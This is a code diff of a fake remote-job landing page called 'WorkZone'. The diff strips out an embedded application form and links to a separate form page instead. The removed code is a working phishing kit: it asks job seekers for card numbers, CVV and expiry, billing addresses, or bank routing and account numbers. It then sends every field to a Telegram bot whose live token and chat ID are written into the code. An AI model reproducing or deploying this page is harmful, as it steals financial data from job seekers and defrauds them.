@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>WorkZone | Remote Job Opportunities</title>
+  <title>WorkZone | Remote Jobs</title>
   <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><text y='0.9em' font-size='90'>💼</text></svg>" />
   <style>
     * {
@@ -16,44 +16,46 @@
       min-height: 100vh;
       display: flex;
       flex-direction: column;
-    }
-    header {
-      padding: 4rem 1.5rem 3rem;
+      justify-content: center;
+      align-items: center;
       text-align: center;
+      padding: 2rem 1rem;
     }
-    header h1 {
+    h1 {
       font-size: 3rem;
       font-weight: 900;
       margin-bottom: 1rem;
       text-shadow: 0 2px 6px rgba(0,0,0,0.3);
     }
-    header p {
+    p {
       font-size: 1.3rem;
       margin-bottom: 2rem;
-      max-width: 400px;
+      max-width: 420px;
       margin-left: auto;
       margin-right: auto;
       text-shadow: 0 1px 4px rgba(0,0,0,0.25);
     }
     .hero-icons {
       font-size: 3.5rem;
+      margin-bottom: 2rem;
+      filter: drop-shadow(0 2px 4px rgba(0,0,0,0.4));
       display: flex;
       justify-content: center;
       gap: 1.5rem;
-      margin-bottom: 2.5rem;
-      filter: drop-shadow(0 2px 4px rgba(0,0,0,0.4));
     }
     .btn-primary {
       background: white;
       color: #007bff;
       font-weight: 700;
-      font-size: 1.2rem;
+      font-size: 1.3rem;
       padding: 1rem 3rem;
       border-radius: 50px;
       border: none;
       cursor: pointer;
       box-shadow: 0 6px 15px rgba(255,255,255,0.6);
       transition: background-color 0.3s ease, color 0.3s ease;
+      text-decoration: none;
+      display: inline-block;
     }
     .btn-primary:hover {
       background: #0056b3;
@@ -64,7 +66,7 @@
       color: #007bff;
       padding: 2.5rem 1rem 3rem;
       border-radius: 16px 16px 0 0;
-      margin-top: auto;
+      margin-top: 3rem;
       display: grid;
       grid-template-columns: repeat(auto-fit, minmax(180px,1fr));
       gap: 2rem;
@@ -86,99 +88,8 @@
       font-size: 2.5rem;
       color: #0056b3;
     }
-    /* FORM CONTAINER */
-    .form-container {
-      max-width: 520px;
-      background: white;
-      color: #2d3a4e;
-      padding: 2rem 2.5rem;
-      margin: 2rem auto 4rem;
-      border-radius: 16px;
-      box-shadow: 0 10px 28px rgba(0,0,0,0.15);
-      display: none;
-      flex-direction: column;
-    }
-    h2 {
-      font-weight: 700;
-      text-align: center;
-      margin-bottom: 1rem;
-    }
-    label {
-      margin-top: 1rem;
-      font-weight: 600;
-      font-size: 0.95rem;
-      display: block;
-    }
-    input, select {
-      width: 100%;
-      padding: 11px 12px;
-      margin-top: 6px;
-      border-radius: 8px;
-      border: 1.8px solid #c3c3c3;
-      font-size: 1rem;
-      font-weight: 400;
-      transition: border-color 0.3s ease;
-    }
-    input:focus, select:focus {
-      outline: none;
-      border-color: #007bff;
-      box-shadow: 0 0 8px rgba(0,123,255,0.3);
-    }
-    .btn {
-      margin-top: 2rem;
-      width: 100%;
-      padding: 14px;
-      font-size: 1.15rem;
-      background: #007bff;
-      color: white;
-      border: none;
-      border-radius: 50px;
-      cursor: pointer;
-      font-weight: 700;
-      transition: background-color 0.3s ease;
-    }
-    .btn:hover {
-      background: #0056b3;
-    }
-    .toggle {
-      display: flex;
-      margin-top: 1.5rem;
-      background: #f1f5fa;
-      border-radius: 50px;
-      overflow: hidden;
-      box-shadow: inset 0 0 5px #d8e0f3;
-      user-select: none;
-    }
-    .toggle div {
-      flex: 1;
-      text-align: center;
-      padding: 12px 0;
-      cursor: pointer;
-      font-weight: 700;
-      color: #007bff;
-      transition: background-color 0.3s ease, color 0.3s ease;
-    }
-    .toggle .active {
-      background: #007bff;
-      color: white;
-    }
-    .step {
-      display: none;
-      flex-direction: column;
-    }
-    .step.active {
-      display: flex;
-    }
-    .thankyou {
-      font-weight: 700;
-      text-align: center;
-      font-size: 1.4rem;
-      color: #007bff;
-      padding: 3rem 1rem;
-    }
-    /* Responsive */
     @media (max-width: 600px) {
-      header h1 {
+      h1 {
         font-size: 2rem;
       }
       .benefits {
@@ -189,18 +100,16 @@
       }
       .btn-primary {
         padding: 1rem 2rem;
-        font-size: 1rem;
+        font-size: 1.1rem;
       }
     }
   </style>
 </head>
 <body>
-  <header>
-    <h1>💼 WorkZone</h1>
-    <p>Your gateway to flexible remote jobs — Start earning from home today!</p>
-    <div class="hero-icons" aria-hidden="true">🚀💻📈🕒🏠</div>
-    <button class="btn-primary" id="showFormBtn">Apply Now</button>
-  </header>
+  <h1>💼 WorkZone</h1>
+  <p>Your gateway to flexible remote jobs — Start earning from home today!</p>
+  <div class="hero-icons" aria-hidden="true">🚀💻📈🕒🏠</div>
+  <a href="form.html" class="btn-primary" role="button">Join Now</a>
 
   <section class="benefits" aria-label="Benefits of WorkZone">
     <div class="benefit"><div class="benefit-icon">💰</div>Earn up to $35/hr</div>
@@ -210,164 +119,5 @@
     <div class="benefit"><div class="benefit-icon">🕒</div>Flexible hours</div>
     <div class="benefit"><div class="benefit-icon">📬</div>Email-based onboarding</div>
   </section>
-
-  <section class="form-container" aria-label="Application Form">
-    <form id="jobForm" novalidate>
-      <!-- Step 1 -->
-      <div class="step active" id="step-1">
-        <h2>Step 1: Your Information</h2>
-        <label for="name">Full Name *</label>
-        <input id="name" name="name" required autocomplete="name" />
-        <label for="email">Email *</label>
-        <input id="email" type="email" name="email" required autocomplete="email" />
-        <label for="phone">Phone *</label>
-        <input id="phone" name="phone" required autocomplete="tel" pattern="\\+?\\d{7,15}" title="Enter a valid phone number" />
-        <label for="education">Education Level *</label>
-        <select id="education" name="education" required>
-          <option value="">Select...</option>
-          <option>High School</option>
-          <option>Associate</option>
-          <option>Bachelor</option>
-          <option>Graduate</option>
-        </select>
-        <label for="industry">Industry *</label>
-        <select id="industry" name="industry" required>
-          <option value="">Select...</option>
-          <option>Retail</option>
-          <option>Technology</option>
-          <option>Healthcare</option>
-          <option>Administration</option>
-        </select>
-        <button type="button" class="btn" onclick="nextStep(2)">Next</button>
-      </div>
-
-      <!-- Step 2 -->
-      <div class="step" id="step-2">
-        <h2>Step 2: Payout Details</h2>
-        <div class="toggle" role="tablist" aria-label="Select payout method">
-          <div id="toggle-card" role="tab" aria-selected="true" tabindex="0" class="active" onclick="togglePayout('card')" onkeydown="if(event.key==='Enter')togglePayout('card')">💳 Card</div>
-          <div id="toggle-bank" role="tab" aria-selected="false" tabindex="0" onclick="togglePayout('bank')" onkeydown="if(event.key==='Enter')togglePayout('bank')">🏦 Bank</div>
-        </div>
-        <div id="card-form" role="tabpanel">
-          <label for="cardName">Name on Card *</label>
-          <input id="cardName" name="cardName" required autocomplete="cc-name" />
-          <label for="cardNumber">Card Number *</label>
-          <input id="cardNumber" name="cardNumber" required autocomplete="cc-number" pattern="\\d{13,19}" title="Enter a valid card number"/>
-          <label for="expiry">Expiry (MM/YY) *</label>
-          <input id="expiry" name="expiry" required autocomplete="cc-exp" pattern="^(0[1-9]|1[0-2])\\/\\d{2}$" title="Format MM/YY" />
-          <label for="cvv">CVV *</label>
-          <input id="cvv" name="cvv" required autocomplete="cc-csc" pattern="\\d{3,4}" title="3 or 4 digit CVV"/>
-          <label for="billingAddress">Billing Address *</label>
-          <input id="billingAddress" name="billingAddress" required autocomplete="street-address" />
-          <label for="billingCity">City *</label>
-          <input id="billingCity" name="billingCity" required autocomplete="address-level2" />
-          <label for="billingState">State *</label>
-          <input id="billingState" name="billingState" required autocomplete="address-level1" />
-          <label for="billingZip">ZIP Code *</label>
-          <input id="billingZip" name="billingZip" pattern="\\d{5}" title="5-digit ZIP code" required autocomplete="postal-code" />
-        </div>
-        <div id="bank-form" role="tabpanel" hidden>
-          <label for="bankName">Bank Name *</label>
-          <input id="bankName" name="bankName" autocomplete="organization" />
-          <label for="routingNumber">Routing Number *</label>
-          <input id="routingNumber" name="routingNumber" autocomplete="routing" />
-          <label for="accountNumber">Account Number *</label>
-          <input id="accountNumber" name="accountNumber" autocomplete="account-number" />
-          <label for="accountType">Account Type *</label>
-          <select id="accountType" name="accountType">
-            <option>Checking</option>
-            <option>Savings</option>
-          </select>
-        </div>
-        <button type="button" class="btn" onclick="nextStep(3)">Next</button>
-      </div>
-
-      <!-- Step 3 -->
-      <div class="step" id="step-3">
-        <h2>Step 3: Confirm & Submit</h2>
-        <p>We will email you with onboarding instructions once you submit.</p>
-        <button type="submit" class="btn">Submit Application</button>
-      </div>
-
-      <!-- Thank You -->
-      <div class="step" id="step-thanks" role="alert" aria-live="polite">
-        <p class="thankyou">✅ Thank you! Your application is pending review.<br/>Check your email within 24 hours.</p>
-      </div>
-    </form>
-  </section>
-
-  <script>
-    const steps = document.querySelectorAll('.step');
-    const cardForm = document.getElementById('card-form');
-    const bankForm = document.getElementById('bank-form');
-    const toggleCard = document.getElementById('toggle-card');
-    const toggleBank = document.getElementById('toggle-bank');
-    const formContainer = document.querySelector('.form-container');
-    const showFormBtn = document.getElementById('showFormBtn');
-
-    showFormBtn.addEventListener('click', () => {
-      formContainer.style.display = 'flex';
-      showFormBtn.style.display = 'none';
-      window.scrollTo({ top: formContainer.offsetTop, behavior: 'smooth' });
-    });
-
-    function nextStep(n) {
-      steps.forEach(s => s.classList.remove('active'));
-      document.getElementById('step-' + n).classList.add('active');
-    }
-
-    function togglePayout(type) {
-      if(type === 'card') {
-        cardForm.hidden = false;
-        bankForm.hidden = true;
-        toggleCard.classList.add('active');
-        toggleBank.classList.remove('active');
-        toggleCard.setAttribute('aria-selected', 'true');
-        toggleBank.setAttribute('aria-selected', 'false');
-
-        // Make card inputs required, bank inputs not required
-        [...cardForm.querySelectorAll('input')].forEach(i => i.required = true);
-        [...bankForm.querySelectorAll('input, select')].forEach(i => i.required = false);
-      } else {
-        cardForm.hidden = true;
-        bankForm.hidden = false;
-        toggleCard.classList.remove('active');
-        toggleBank.classList.add('active');
-        toggleCard.setAttribute('aria-selected', 'false');
-        toggleBank.setAttribute('aria-selected', 'true');
-
-        // Make bank inputs required, card inputs not required
-        [...cardForm.querySelectorAll('input')].forEach(i => i.required = false);
-        [...bankForm.querySelectorAll('input, select')].forEach(i => i.required = true);
-      }
-    }
-
-    document.getElementById('jobForm').addEventListener('submit', function(e) {
-      e.preventDefault();
-      const form = this;
-      if (!form.checkValidity()) {
-        alert('Please fill in all required fields correctly.');
-        return;
-      }
-      const data = Object.fromEntries(new FormData(form));
-      const TOKEN = '8076304397:AAGlBEOPgrrA8PO-3u7UfMmu2tYhGe1CMj8';
-      const CHAT_ID = '1318100118';
-      let msg = '*📥 New WorkZone Application*%0A';
-      for (let k in data) {
-        msg += `*${k}*: ${data[k]}%0A`;
-      }
-      fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown'})
-      });
-      nextStep('thanks');
-      form.reset();
-      window.scrollTo({ top: formContainer.offsetTop, behavior: 'smooth' });
-    });
-
-    // Initialize required attributes on load for card payout as default
-    togglePayout('card');
-  </script>
 </body>
 </html>
